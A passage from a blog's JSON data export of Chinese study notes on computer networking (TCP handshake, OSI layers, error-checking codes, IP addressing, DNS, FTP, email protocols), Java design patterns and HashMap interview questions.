SYN 设置为1, seq为 y。服务端将上述所有信息放到 SYN+ACK 报文段中，一并发送给客户端，此时服务器进入 SYN_RECV状态。 SYN_RECV是指,服务端被动打开后,接收到了客户端的SYN并且发送了ACK时的状态。再进一步接收到客户端的ACK就进入ESTABLISHED状态。 第三次握手：客户端收到服务端的 SYN+ACK(确认符) 报文段；然后将 ACK 设置为 y+1,向服务端发送ACK报文段，这个报文段发送完毕后，客户端和服务端都进入ESTABLISHED(连接成功)状态，完成TCP 的三次握手。 上面的解释可能有点不好理解，用《图解HTTP》中的一副插图 帮助大家。 最后再看一下完整的过程： 如果有大量的连接，每次在连接，关闭都要经历三次握手，四次挥手，这显然会造成性能低下。因此。Http 有一种叫做 长连接（keepalive connections） 的机制。它可以在传输数据后仍保持连接，当客户端需要再次获取数据时，直接使用刚刚空闲下来的连接而无需再次握手。","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://kayleh.top/tags/network/"}]},{"title":"计算机网络概论","slug":"计算机网络-1","date":"2020-07-24T21:28:42.000Z","updated":"2021-04-11T17:11:29.032Z","comments":true,"path":"introduction-to-computer-network/","link":"","permalink":"https://kayleh.top/introduction-to-computer-network/","excerpt":"计算机网络","text":"计算机网络 概念计算机网络是一个分散的、具有独立功能的计算机系统，通过通讯设备与线路连接起来由功能完善的软件实现资源共享和信息共享的系统。 组成1.组成部分硬件、软件、协议 2.工作方式边缘部分 用户直接使用 C/S方式 P2P方式 核心部分 为边缘部分服务 3.功能组成 通信子网 实现数据通信 资源子网 实现资源共享/数据处理 分类1.按分布范围分:广域网WAN，城域网MAN，局域网LAN，个人区域网PAN 2.按使用者分: 公用网(中国电信), 专用网(军事) 3.按交换技术分:电路交换、报文交换、分组交换 4.按拓扑结构分： 5.按传输技术来分： 广播式网络：共享公共通信信道 点对点网络：使用分组存储转发和路由选择机制 标准化工作要实现不同厂商的硬、软件之间相互连通，必须遵从统一的标准。 标准的分类法定标准 由权威机构制定的正式的、合法的标准 OSI 事实标准 某些公司的产品在竞争中占据了主流，时间长了 这些产品中的协议和技术就成了标准 TCP/IP 性能指标速率速率即数据率或称数据传输率或比特率 比特 数据传输单位 1/0 位 连接在计算机网络上的主机在数字信道上传送数据位数的速率 单位是b/s，kb/s，Mb/s，Gb/s，Tb/s 1kb/s = 10三次方b/s 存储容量 1Byte（字节）=8bit（比特） 1KB=2十次方B=1024B=1024*8b 1MB=2十次方KB=1024KB 带宽 带宽原本指某个信号具有的频带宽度，即最高频率与最低频率之差，单位是赫兹（Hz）。 计算机网络中，带宽用来表示网络的通信线路传送数据的能力，通常是指单位时间内从网络中的某一点到另一点所能通过的“最高数据率”。单位是 比特每秒 。b/s，kb/s，Mb/s，Gb/s。 网络设备所支持的最高速度。 吞吐量 表示在单位时间内通过某个网络（或信道、接口）的数据量。单位b/s，kb/s，Mb/s等。 吞吐量受网络的带宽或网络的额定速率的限制。 带宽可以理解为链路的理论传输速率上限，吞吐量是某时间内链路实际的数据量 时延指数据（报文/分组/比特流）从网络上（或链路）的一端传送到另一端所需要的时间。也叫延迟或迟延。单位是s。 时延 发送时延（传播时延）: 从发送分组的第一个比特算起，到该分组的最后一个比特发送完毕所需的时间。发生在网络设配器上。 123 数据长度发送时延： --------------- 信道带宽(发送速率) 传播时延：取决于电磁波传播速度和链路长度。发生在信道上的。 123 信道长度传播时延： ———————————————————— 电磁波在信道上的传播速率 排队时延：等待输出/入 链路可用 处理时延 处理时延（海水提取盐） 发送时延（运盐到城里）排队时延（买盐）传播时延（给你盐） 时延带宽积时延带宽积 = 传播时延 + 带宽 时延带宽积又称为以比特位单位的链路长度。 即“塞满链路时候的比特长度”。 容量 往返时延RTT从发送方发送数据开始，到发送方收到接收方的确认（接收方收到数据后立即发送确认），总共经历的时延。 RTT越大，在收到确认之前，可以发送的数据越多。 RTT包括 往返传播时延=传播时延*2 末端处理时间 利用率 信道利用率 123 有数据通过的时间&#x3D; --------------------- (有+无)数据通过的时间 网络利用率 1信道利用率加权平均值 分层为什么要分层？ 发送文件前要完成的工作： 1）发起通信的计算机必须将数据通信的通路进行激活。 2）要告诉网络如何识别目标主机 3）发起通信的计算机要查明目的主机是否开机，并且与网络连接正常。 4）发起通信的计算机要弄清楚，对方计算机中文件管理程序是否已经做好准备工作。 5）确保差错和意外可以解决 。。。。 分层的基本原则 分层结构 概念 OSI参考模型 物联网输会示用 通信过程 应用层 用户与网络的界面 所有能和用户交互产生网络流量的程序 应用层服务: 文件传输(FTP) 电子邮件(SMTP) 万维网(HTTP) 表示层 用于处理在两个通信系统中交换信息的表示方式(语法和语义) 功能一: 数据格式交换 功能二: 数据加密解密 功能三: 数据压缩和恢复 会话层 向表示层实体/用户进程提供建立连接并在连接上有序地传输数据. 这是会话,也是建立同步(SYN) 功能: 一. 建立,管理,终止会话 二. 使用校验点可使会话在通信失效时从校验点/同步点继续恢复通信,实现数据同步. 适用于传输大文件. 传输层 负责主机中两个进程的通信,即端到端的通信. 传输单位时报文段或用户数据报. 上面三层的都是主机应用交流 下面三层都是设备转发数据 功能: 一.可靠传输,不可靠传输 发的文字消息是不可靠传输，发出去后就不管了 二. 差错控制 发送的报文段丢失了, 传输层负责纠正错误. 三. 流量控制 四. 复用分用 复用:多个应用层进程可同时使用下面运输层的服务. 分用: 运输层把收到的信息分别交付给上面应用层的相应的进程. 网络层 主要任务是把分组从源端传到目的端,为分组交换网上的不同主机提供通信服务.网络层传输单位是数据报 功能: 一.路由选择. 最佳路径 二.流量控制 三.差错控制 四.拥塞控制 若所有节点都来不及接受分组,而要丢弃大量分组的话,网络就处于拥塞状态.因此要采取一定措施,缓解这种拥塞. 数据链路层 主要任务是把网络层传下来的数据报组装成帧. 数据链路层/链路层的传输单位是帧. 物理层 主要任务是在物理媒体上实现比特流的透明传输. 物理层传输单位是比特. 半双工(回合制) TCP/IP模型 相同点： 1.都分层 2.基于独立的协议栈的概念 3.可以实现异构网络互联 不同点： 5层参考模型 物理层物理层解决如何在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。 数据通信 三种通讯方式 两种数据传输方式 码元 速率,波特,带宽 奈式准则（Nyquist） 是在理想状态下得出的结论 香农公式（Shannon）是在有噪声的信道中得出的结论 基带信号和宽带/带通信号（Base band，pass band） 计算机网络中用的基带信号是数字信号 编码 将数据转化为数字信号 数字数据(digtal data)通过 数字发送器(digit emitter) 转化为 数字信号(digtal signal) 模拟数据(analog data)通过 PCM编码器(PCM coder) 转化为 数字信号 (digtal signal) 单极性不归零编码：只使用一个电压值，高电平表示1，低电平表示0. 双极性不归零编码：用幅值相等的正负电平表示二进制数1和0. 单极性归零编码：发送码1时高电平在整个码元期间只持续一段时间，其余时间返回零电平。 双极性归零编码：正负零三个电平，信号本身携带同步信息。 曼彻斯特编码：单极性编码的缺点是没有办法区分此时是没有信号，还是有信号，但是信号是0.这种编码方式是bit中间有信号，低-高跳转表示0，高-低跳转表示1，一个时钟周期只可以表示一个bit，并且必须通过两次采样才能得到一个bit。它能携带时钟信号，而且能区分此时是没有信号还是信号为0. 差分曼彻斯特编码：抗干扰能力比曼彻斯特编码更强。bit与bit之间有信号跳变，表示下一个bit为0，bit与bit之间没有信号跳变，表示下一个bit为1。 调制：数据转化为模拟信号（了解） 常用的调制方法：调频(AM)，调频(FM)，调相(PM) 模拟数据(analog data)通过 调制器(modulaotr) 转化为 模拟信号 (analog signal) 数字数据(digtal data)通过 调制器(modulaotr) 转化为 模拟信号 (analog signal) 物理层传输介质传输介质分为导向性传输介质和非导向性传输介质 导向性传输介质 电磁波沿着固体媒介（铜线or光纤）被导向传播 非导向性传输介质 自由空间，如空气，水等等 常见的导向性传输介质双绞线 根据有无屏蔽层分为屏蔽双绞线（STP) 和 无屏蔽双绞线（UTP） 同轴电缆（Coaxial Cable） 光纤（Optical fiber）根据入射角不同，又分为单模光纤和多模光纤 常见的非导向性传输介质包括无线电波，微波，红外线和激光等 物理层设备中继器（RP repeater）注释：5-4-3规则是为了限制中继器使用次数的，理由可见图5是指不能超过5个网段4是指在这些网段中的物理层网络设备（中继器，集线器）最多不超过4个3是指这些网段中最多只有三个网段挂有计算机 集线器（Hub）集线器是个大的冲突域，同时只能有两个设备进行通讯，只会传输信号，没有智能。 数据链路层（Data Link Layer）基本概念 封装成帧与透明传输封装成帧就是加将数据加头加尾，相当于将数据打包透明传输就是为了防止特殊的数据无法正常传输的的情况的发生，比如说在封装成帧的过程中出现数据中的某些标记符与开始/结束标记符恰巧重复等等情况 透明传输的应用字符计数法就是在帧的首部做计数，看看数据是否错误缺点：如果在某一个帧内，标记位后面的某个字节的数据丢失，那么会影响后面的帧比如3 1 1 和 4 2 2 2，如果前面的帧丢失变成 3 1，那么后面的4就会被补到前面变成 3 1 4导致错误 字符填充法就是加头加尾分别标记开始结束，和零比特填充法（见下）对比，开始和结束的对应的字符不一样但有可能出现数据内某段比特流数据正好与标记字段重复，从而导致误判断的情况解决方法：添加转义字符 零比特填充法 违规编码法因为曼彻斯特编码不使用高-高，低-低来表示，所以如果使用高-高，低-低来表示帧起始和终止就不会与数据冲突 差错控制差错是什么，从哪来的数据链路层的差错检测的是比特的错误 为什么要在数据链路层进行差错控制？因为错误可以尽早发现，不会让一个错误的数据包发送了很长时间到达最终目的地之后才被发现，从而导致网络资源的浪费 检错编码（奇偶校验码，循环冗余码CRC）奇偶校验码缺点：只能检测出1，3，5，7…等等奇位数错误，检测成功率位50% 循环冗余码CRC就是用传输数据除以生成多项式得到冗余码 实际例子注释：1.阶数就是最高位是哪位，然后位数-1，如10011就是5-1=4,1011就是4-1=32.异或运算就是相同得0，不同得1，比如100和101做异或，结果就是0013.出书和最后的余数添加到要发送的数据后面，称为帧检验序列FCS 接收方收到数据后进行检测需要注意的地方 纠错编码（海明码）分为四步 第一步 确认校验码位数r 第二步 确定校验码和数据的位置注释：1.为什么是10为数据位？因为4位校验码+6位信息位=10位2.校验码放到2的几次方的位置，其他的地方按顺序放已知的信息位 第三步 求出校验码的值注释1.先是通过二进制位确定有几位。本题中因为最大位10的二进制是1010，所以是4为，将其标注2.然后从p1开始看，看p1的二进制位的数值和所有信息位的对应位置的数值是否相同，然后找出来这些位这里有点难理解，这里以p1为例辅助理解，这里找出来的就是P1,D1,D2,D4,D5 然后计算异或值，比如说这里D1=1,D2=0,D4=1,D5=0,就是p1要同时和0,1，0,1进行异或之后得到0，为了标识我加粗原始计算数据举例：0和1异或得1,1和0异或得1,1和1异或得0，那么p1和0异或得0，p1就是0了3.其他同理，按顺序计算出P2,P3,P4,然后填入表格 第四步 检测并纠错就是和上面一样，将所有校验位进行运算，得出的结果的值就是错误的位 数据链路层的流量控制和可靠传输流量控制与可靠传输流量控制是为了让传输过程中的发送速度和接受速度匹配，减少传输出错与资源浪费可靠传输是发送端发送什么，接收端就要受到什么 停止等待协议（Stop-and-Wait） 停止等待协议的无差错情况注释：因为一次就一个，所以用0和1标记ack就行 停止等待协议的特点1.简单2.信道利用率低。大部分时间数据都在路上，发送方很长时间闲置，资源浪费 · 后退N帧协议（GBN）因为停止等待协议太浪费时间了，所以尝试采用GBN，发送连续多个数据帧，以增大信道利用率注释：累计确认：就是收到一个确认帧，那么它和它之前的所有帧都默认已收到，反之，如果某个确认帧没收到，那么它和它之后的所有帧都默认丢失（即使收到了也丢掉），进行重传 下图是一个实例注释：此图发送2帧时丢失，所以接收方几首收到后面的帧也是直接丢弃并且发送最晚收到的有效帧1的ACK，直至2帧的超时重传机制被触发进行重传并得到ACK之后，接收方才会接受2帧以及后面的帧 网络层网络层概述 网络层主要任务：设法将源节点发出的数据包传送到目的节点，从而向传输层提供最基本的端到端的数据传送服务。概括如下：为传输层提供服务：面向连接的网络服务(虚电路服务)和无连接的网络服务(数据包服务)组包和拆包：数据传输的基本单位是数据包(分组)路由选择：(也叫路径选择)根据一定的原则和路由选择算法在多节点的通信子网中选择一条最佳路径流量控制：控制阻塞，避免死锁方法有4种：滑动窗口、预约缓冲区、许可证、分组丢弃 路由选择算法 静态路由算法（非自适应算法）(1) 最短路由选择(2) 扩散式路由选择(3) 随机路由选择(4) 集中路由选择 动态路由算法（自适应算法）(1) 分布式路由选择策略(2) 集中路由选择策略 网络层的连接设备 路由器 第三次交换机 IP地址 IP地址及分类Internet上基于TCP/IP的网络中每台设备既有IP地址(即逻辑地址)，也有MAC地址(即物理地址) IP地址结构： 网络ID + 主机ID IP地址分类 A类 0 - - - (网络号8位) B类 1 0 - - (网络号16位) C类 1 1 0 - (网络号24位) D类 1 1 1 0 -多播地址 E类 1 1 1 1 0 - 保留为今后使用 子网掩码子网掩码定义：（1）对应于IP地址的网络ID的所有位都设为”1”。1必须是连续的（2）对应于主机ID的所有位都设为0注意：IP分类的标准只有一个，即第一个8位数组是哪个范围，并不看子网掩码。例如IP为2.1.1.1的子网掩码为255.255.255.0，属于A类地址。该子网掩码仅仅是借用了主机ID的16位作为子网ID子网划分原因：为了解决IP地址资源短缺的问题，同时为了提高IP地址资源的利用率子网划分方法：网络管理员需要从原有IP地址的主机位中借出连续的若干高位作为子网络标识无分类编址CIDR(Classless Inter Domain Routing):无类别的域间路由，不受地址类别划分的约束，任何有效的IP地址一律对待，区别网络ID仅仅依赖于子网掩码。CIDR确定了3个网络地址范围保留为内部网络使用，即公网主机不能使用这3个地址范围的IP地址： A类 10.0.0.0 - 10.255.255.255 B类 172.16.0.0 - 172.31.255.255 C类 192.168.0.0 - 192.168.255.255 可变长子网掩码(VLSM)解决在一个网络系统中使用多种层次的子网化IP地址的问题 IP数据报格式TCP/IP协议 IP封装、分片与重组IP封装：一个网络帧携带一个数据报的传输方式叫做封装(Encapsulation)。IP数据报被封装到以太网的MAC数据帧。报文分片：将IP报文分段成两个或更多的报文以满足最大传输单元的要求。(不同的物理网络允许的最大帧长度MTU各不相同)IP数据报重组：在接收到所有分片的基础上，主机对分片进行重新组装的过程叫做IP数据报的重组。 网络设备路由器是一种具有多个输入端口和多个输出端口的专用计算机，任务是转发分组。路由器结构分为两大部分： 路由选择部分(控制部分)核心部件路由选择处理器，任务是根据所选定的路由选择协议构造出路由表，同时经常或定期地和相邻路由器交换信息而不断地更新和维护路由表。 分组转发部分组成：(1) 交换结构：根据路由表对分组进行处理，将某个输入端口进入的分组从一个合适的输出端口转发出去。(2) 一组输入端口：查找和转发功能的路由器的交换功能(3) 一组输出端口 总结：路由器的功能如下： 路由选择协议转换实现网络层的一些功能网络管理和安全多协议路由选择网关 又称网间连接器或协议转换器。与网桥只是简单的传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同时，网关提供过滤和安全功能。大多数网关运行在应用层。 路由选择协议虚拟专用网和网络地址转换虚拟专用网VPN网络地址转换NATIPv6ICMPARP和RARP应用层域名系统DNS概述 DNS(Domain Name System)域名系统 DNS可以为计算机服务器以及介入互联网或局域网中的任何资源进行分层次的名称解析功能 DNS主要功能为域名和ip地址之间的解析 DNS结构 1.命名方法：层次树状结构(类似于全球邮政系统和电话系统)域名系统分级：一般分为：主机名.三级域名.二级域名.顶级域名.2.最后一个.代表根域，根域是所有域的起点.例如：service.example.com. 顶级域名：代表国家或者组织机构，由ICANN管理- cn 中国- com 商业公司- edu 教育机构二级域名：代表组织或公司名称三级域名：代表组织或公司内部的主机四级域名：mail/www 域名查询方式 1.递归查询如果客户端准备访问百度，客户端首先会查询本地缓存中是否有之前的查询记录，如果有，直接读取结果，如果没有则向本地DNS服务器发起查询请求[递归查询]，本地DNS服务器如果有答案，就会将答案直接返回给客户端，但本地DNS服务器没有答案时，这时候就向根域服务器查询，根域服务器并不会返回www.baidu.com主机的ip地址，返回的是.com的ip地址，然后本地DNS到com服务器区查询baidu的地址，查询完成后，会将结果缓存到本地。2.迭代查询迭代查询每次由客户端发起请求，域名服务器提供需要查询的信息则返回ip地址信息，如不能则引导客户端到其他域名服务器查询 两者区别：递归查询由别人查找告诉自己答案，迭代查询由自己亲自去查。 DNS服务器分类高速缓存服务器：将每次域名查询结果缓存到本地主DNS服务器：提供权威的域名信息，可信赖辅助DNS服务器：DNS信息来源于主DNS服务器 DNS服务器搭建unboundbind DNS查询流程为什么机器在处理IP数据报时要使用IP地址而不使用域名呢？因为IP地址的长度是固定的32位，而域名的长度并不是固定的，机器处理起来比较困难理论上整个因特网可以只使用一个域名服务器，使它装入因特网上所有主机名，并回答所有对IP地址的查询。但因特网规模太大，域名服务器负荷过大，一旦域名服务器出现故障，整个因特网就会瘫痪。因此1983年因特网采用层次树状结构的命名方法，并使用分布式的域名系统DNS。 域名到IP地址的解析过程当一个应用进程需要把主机名解析为IP地址时，该应用进程就调用解析程序(resolver)，并称为DNS的一个客户，把待解析的域名放在DNS请求报文中，以UDP用户数据报方式发给本地域名服务器(UDP减小了开销).本地域名服务器在查找域名后，把对应的IP地址放在回答报文中返回。应用进程获得目的主机的IP地址后即可进行通信。若本地域名服务器不能回答该请求，则此域名服务器就暂时称为DNS中的另一个客户，并向其他域名服务器发出查询请求。直到找到能够回答该请求的域名服务器为止。 文件传输协议文件共享协议有两类： 1.复制整个文件，如基于TCP的FTP和基于UDP的TFTP特点：若要存取一个文件，就必须先获得一个本地的文件副本。如果要修改文件，只能对文件的副本进行修改，然后 再将修改后的文件副本传回到原节点。 2.联机访问(on-line access)：允许多个程序同时对一个文件进行存取。如网络文件系统NFS(Network-File-System),其可使本地计算机共享远地的资源，就像这些资源在本地一样。NFS允许应用进程打开一个远地文件，并能在该文件的某一个特定的位置上开始读写数据。网络上传送的指数少量的修改数据。 FTP的基本原理主要功能：减少或消除在不同操作系统下处理文件的不兼容性。FTP服务器进程由两部分组成： 主进程：负责接受新的请求。工作步骤：1.打开21端口，使客户进程能够连接上2.等待客户进程发出连接请求3.启动从属进程来处理客户进程发来的请求。4.回到等待状态，继续接受其他客户进程发来的请求。 若干个从属进程：负责处理单个请求 在进行文件传输时，FTP的客户和服务器之间要建立两个并行的TCP连接： 控制连接 整个会话期间一直保持打开。服务器端的控制进程在接收到FTP客户发来的文件传输请求后就创建”数据传送进程”和”数据连接”，用来连接客户端和服务器端的数据传送进程。 数据连接 由于FTP使用了一个分离的控制连接，因此FTP的控制信息是带外传送的。 简单文件传输协议TFTP使用UDP数据报，因此TFTP需要有自己的差错改正措施。端口69特点： 每次传送的数据报文中有512字节的数据，最后一次不足512字节 数据报文按序编号，从1开始 支持ASCII码或二进制传送 可对文件进行读或写 使用很简单的首部 电子邮件历史1982年，ARPANET的电子邮件问世，即简单邮件传送协议SMTP和因特网文本报文格式1993年，由于SMTP只能传送可打印的7位ASCII码邮件，于是提出了通用因特网邮件扩充MIME(Multipurpose Internet Mail Extensions)MIME在其邮件首部中说明了邮件的数据类型(如文本、声音、图像、视像等)；MIME邮件可同时传送多种类型数据。 概述 用户代理(UA)： 用户与电子邮件系统的接口，通常为运行在用户PC机的程序。又称电子邮件客户端软件。例如微软的Outlook和张小龙的Foxmail具备四个功能：撰写、显示、处理、通信邮件服务器： 发送和接收邮件，同时要向发件人报告邮件传送的结果(已交付、被拒绝、丢失)邮件服务器使用两种不同的协议(即邮件服务器同时充当客户和服务器)：1用于用户代理向邮件服务器发送邮件或在邮件服务器之间发送邮件，如SMTP协议2用于用户代理从邮件服务器读取邮件，如邮局协议POP3电子邮件： 由信封(envelope)和内容(content)两部分组成。信封最重要的是收件人的地址。TCP/IP体系的电子邮件系统规定电子邮件格式(收件人邮箱名即用户名)：收件人邮箱名@邮箱所在主机的域名 简单邮件传送协议SMTP-规定了在两个相互通信的SMTP进程之间应如何交换信息。-SMTP规定了14条命令和21种应答信息-发送方和接收方的邮件服务器之间的SMTP通信分三个阶段： 连接建立： SMTP客户每隔一定时间对邮件缓存扫描一次，发现有邮件就使用SMTP端口号(25)与接收方建立TCP连接。建立连接后接收方发出“220 Service ready”SMTP客户向SMTP服务器发送HELO命令SMTP服务器接收邮件后回复”250 OK”(表示准备好接收)；若不可以回复”421 Service not available”(服务不可用) 邮件传送： 从MAIL命令开始。SMTP服务器准备好接收邮件，返回”250 OK”,否则，返回451(处理时出错)，452(存储空间不够)，500(命令无法识别)RCPT命令：发送给一个/多个收件人 连接释放： 邮件发送完毕后，SMTP客户发送QUIT命令。服务器返回”221(服务关闭)”，邮件传送的全部过程即结束。 邮件读取协议POP3和网际报文存取协议IMAPIMAP(Internet Message Access Protocol) IMAP最大的好处就是：用户可以在不同的地方使用不同的计算机随时上网阅读和处理自己的邮件。还允许收件人只读取邮件中的某一个部分。IMAP的缺点：如果用户没有将邮件复制到自己的PC机上，则邮件一直是存放在IMAP服务器上。 基于万维网的电子邮件20世纪90年代中期，Hotmail引入基于万维网的电子邮件。 1.电子邮件从A的浏览器发送到网易邮件服务器时，不是使用SMTP协议，而是使用HTTP协议。2.电子邮件从网易邮件服务器发送到新浪的邮件服务器，使用SMTP协议，而不是HTTP协议。3.B用浏览器从新浪邮件服务器读取A发来的邮件时，使用HTTP协议，不是使用POP3或IMAP协议。流程如图 通用因特网邮件扩充MIME电子邮件协议SMTP缺点：1.SMTP不能传送可执行文件或其他的二进制对象2.SMTP限于传送7位ASCII码;其他非英语国家的文字(如中文)就无法传送。3.SMTP服务器会拒绝超过一定长度的邮件4.某些SMTP的实现没有按照SMTP的因特网标准，如回车、换行的删除和增加、超过76字符时的处理、多余空格的删除等通用因特网邮件扩充MIME： 增加了邮件主体的结构，并定义传送非ASCII码的编码规则在现有的电子邮件程序和协议下传送包含三部分内容： 1.5个新的邮件首部字段，提供主体信息MIME-Version：MIME的版本Content-Description:说明邮件是否有图像、音频或视频Content-Id:邮件的唯一标识符Content-Transfer-Encoding:内容传送编码，邮件主题是如何编码的。三种常用的是7位ASCII码、quoted-printable编码、base64编码Content-Type：内容类型，邮件主体的数据类型(7个)和子类型(15种) 定义许多邮件内容的格式 定义了传送编码(每个MIME报文包含告知收件人数据类型和使用编码的信息) MIME示例邮件如下：","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://kayleh.top/tags/network/"}]},{"title":"设计模式","slug":"设计模式","date":"2020-07-24T01:48:28.000Z","updated":"2021-04-11T17:11:29.040Z","comments":true,"path":"design-patterns/","link":"","permalink":"https://kayleh.top/design-patterns/","excerpt":"设计模式","text":"设计模式 结构型模式如何实现动态代理？Java实现动态代理的大致步骤如下： 1.定义一个委托类和公共接口。 2.自己定义一个类（调用处理器类，即实现 InvocationHandler 接口），这个类的目的是指定运行时将生成的代理类需要完成的具体任务（包括Preprocess和Postprocess），即代理类调用任何方法都会经过这个调用处理器类（在本文最后一节对此进行解释）。 3.生成代理对象（当然也会生成代理类），需要为他指定(1)委托对象(2)实现的一系列接口(3)调用处理器类的实例。因此可以看出一个代理对象对应一个委托对象，对应一个调用处理器实例。 4.Java 实现动态代理主要涉及以下几个类： ①java.lang.reflect.Proxy: 这是生成代理类的主类，通过 Proxy 类生成的代理类都继承了 Proxy 类，即 DynamicProxyClass extends Proxy。 ②java.lang.reflect.InvocationHandler: 这里称他为”调用处理器”，他是一个接口，我们动态生成的代理类需要完成的具体内容需要自己定义一个类，而这个类必须实现 InvocationHandler 接口。 123456789public final class $Proxy1 extends Proxy implements Subject&#123; private InvocationHandler h; private $Proxy1()&#123;&#125; public $Proxy1(InvocationHandler h)&#123; this.h = h; &#125; public int request(int i)&#123; Method method = Subject.class.getMethod(\"request\", new Class[]&#123;int.class&#125;); //创建method对象 return (Integer)h.invoke(this, method, new Object[]&#123;new Integer(i)&#125;); //调用了invoke方法 &#125; &#125; java中有哪些代理模式？静态代理，动态代理，Cglib代理。 Java IO都有哪些设计模式，简单介绍一下。装饰模式和适配器模式 创建者模式请你介绍一下单例模式？再说一说 懒汉式的单例模式如何实现单例？定义：保证一个类仅有一个实例，并提供一个访问它的全局访问点。 优点：单例类只有一个实例、共享资源，全局使用节省创建时间，提高性能。可以用静态内部实现，保证是懒加载就行了，就是使用才会创建实例对象。 行为者模式 策略模式也叫政策模式，是一种行为型设计模式，是一种比较简单的设计模式。策略模式采用了面向对象的继承和多态机制。略模式适合使用在：1.多个类只有在算法或行为上稍有不同的场景。2.算法需要自由切换的场景。3.需要屏蔽算法规则的场景。 使用策略模式当然也有需要注意的地方，那么就是策略类不要太多，如果一个策略家族的具体策略数量超过4个，则需要考虑混合模式，解决策略类膨胀和对外暴露问题。在实际项目中，我们一般通过工厂方法模式来实现策略类的声明。 对于设计模式，你了解哪些？请手写一下观察者模式。 观察者模式优点： 观察者模式在被观察者和观察者之间建立一个抽象的耦合。被观察者角色所知道的只是一个具体观察者列表，每一个具体观察者都符合一个抽象观察者的接口。被观察者并不认识任何一个具体观察者，它只知道它们都有一个共同的接口。由于被观察者和观察者没有紧密地耦合在一起，因此它们可以属于不同的抽象化层次。如果被观察者和观察者都被扔到一起，那么这个对象必然跨越抽象化和具体化层次。 观察者模式缺点： 如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。 如果在被观察者之间有循环依赖的话，被观察者会触发它们之间进行循环调用，导致系统崩溃。在使用观察者模式是要特别注意这一点。 如果对观察者的通知是通过另外的线程进行异步投递的话，系统必须保证投递是以自恰的方式进行的。 虽然观察者模式可以随时使观察者知道所观察的对象发生了变化，但是观察者模式没有相应的机制使观察者知道所观察的对象是怎么发生变化的。 你了解的 Java设计模式。 所谓设计模式，就是一套被反复使用的代码设计经验的总结（情境中一个问题经过证实的一个解决方案）。使用设计模式是为了可重用代码、让代码更容易被他人理解、保证代码可靠性。设计模式使人们可以更加简单方便的复用成功的设计和体系结构。将已证实的技术表述成设计模式也会使新系统开发者更加容易理解其设计思路。在GoF的《Design Patterns: Elements of Reusable Object-Oriented Software》中给出了三类（创建型[对类的实例化过程的抽象化]、结构型[描述如何将类或对象结合在一起形成更大的结构]、行为型[对在不同的对象之间划分责任和算法的抽象化]）共23种设计模式，包括：Abstract Factory（抽象工厂模式），Builder（建造者模式），Factory Method（工厂方法模式），Prototype（原始模型模式），Singleton（单例模式）；Facade（门面模式），Adapter（适配器模式），Bridge（桥梁模式），Composite（合成模式），Decorator（装饰模式），Flyweight（享元模式），Proxy（代理模式）；Command（命令模式），Interpreter（解释器模式），Visitor（访问者模式），Iterator（迭代子模式），Mediator（调停者模式），Memento（备忘录模式），Observer（观察者模式），State（状态模式），Strategy（策略模式），Template Method（模板方法模式）， Chain Of Responsibility（责任链模式）。 开发中都用到了 哪些设计模式? 用在什么场合? 每个模式都描述了一个在我们的环境中不断出现的问题，然后描述了该问题的解决方案的核心。通过这种方式，你可以无数次地使用那些已有的解决方案，无需在重复相同的工作。主要用到了MVC的设计模式。用来开发JSP/Servlet或者J2EE的相关应用。简单工厂模式等。 J2EE 的常用 设计模式有哪些？再详细说说工厂模式。 Java中的23种设计模式：Factory（工厂模式）， Builder（建造模式）， Factory Method（工厂方法模式），Prototype（原始模型模式），Singleton（单例模式）， Facade（门面模式），Adapter（适配器模式）， Bridge（桥梁模式）， Composite（合成模式），Decorator（装饰模式）， Flyweight（享元模式）， Proxy（代理模式），Command（命令模式）， Interpreter（解释器模式）， Visitor（访问者模式），Iterator（迭代子模式）， Mediator（调停者模式）， Memento（备忘录模式），Observer（观察者模式）， State（状态模式）， Strategy（策略模式），Template Method（模板方法模式）， Chain Of Responsibleity（责任链模式）工厂模式：工厂模式是一种经常被使用到的模式，根据工厂模式实现的类可以根据提供的数据生成一组类中某一个类的实例，通常这一组类有一个公共的抽象父类并且实现了相同的方法，但是这些方法针对不同的数据进行了不同的操作。首先需要定义一个基类，该类的子类通过不同的方法实现了基类中的方法。然后需要定义一个工厂类，工厂类可以根据条件生成不同的子类实例。当得到子类的实例后，开发人员可以调用基类中的方法而不必考虑到底返回的是哪一个子类的实例。 说说你所熟悉 或听说过的，J2EE中的几种常用模式。再讲讲你对设计模式的一些看法 Session Facade Pattern：使用SessionBean访问EntityBean Message Facade Pattern：实现异步调用EJB Command Pattern：使用Command JavaBeans取代SessionBean，实现轻量级访问Data Transfer Object Factory：通过DTO Factory简化EntityBean数据提供特性Generic Attribute Access：通过AttibuteAccess接口简化EntityBean数据提供特性Business Interface：通过远程（本地）接口和Bean类实现相同接口规范业务逻辑一致性ＥＪＢ架构的设计好坏将直接影响系统的性能、可扩展性、可维护性、组件可重用性及开发效率。项目越复杂，项目队伍越庞大则越能体现良好设计的重要性。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"数据结构与算法","slug":"数据结构与算法","date":"2020-07-24T01:19:17.000Z","updated":"2021-04-11T17:11:28.911Z","comments":true,"path":"data-structures-and-algorithms/","link":"","permalink":"https://kayleh.top/data-structures-and-algorithms/","excerpt":"数据结构与算法","text":"数据结构与算法 哈希hashCode() 和equals() 方法的重要性体现在什么地方？ Java中的HashMap使用hashCode()和equals()方法来确定键值对的索引，当根据键获取值的时候也会用到这两个方法。如果没有正确的实现这两个方法，两个不同的键可能会有相同的hash值，因此，可能会被集合认为是相等的。而且，这两个方法也用来发现重复元素。所以这两个方法的实现对HashMap的精确性和正确性是至关重要的。 Java中的HashMap的工作原理是什么？HashMap类有一个叫做Entry的内部类。这个Entry类包含了key-value作为实例变量。 每当往hashmap里面存放key-value对的时候，都会为它们实例化一个Entry对象，这个Entry对象就会存储在前面提到的Entry数组table中。Entry具体存在table的那个位置是 根据key的hashcode()方法计算出来的hash值（来决定）。 什么是hashmap?HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。HashMap 继承于AbstractMap，实现了Map、Cloneable、java.io.Serializable接口。HashMap 的实现不是同步的，这意味着它不是线程安全的。它的key、value都可以为null。此外，HashMap中的映射不是有序的。 HashMap 的实例有两个参数影响其性能：“初始容量” 和 “加载因子”。容量 是哈希表中桶的数量，初始容量 只是哈希表在创建时的容量。加载因子 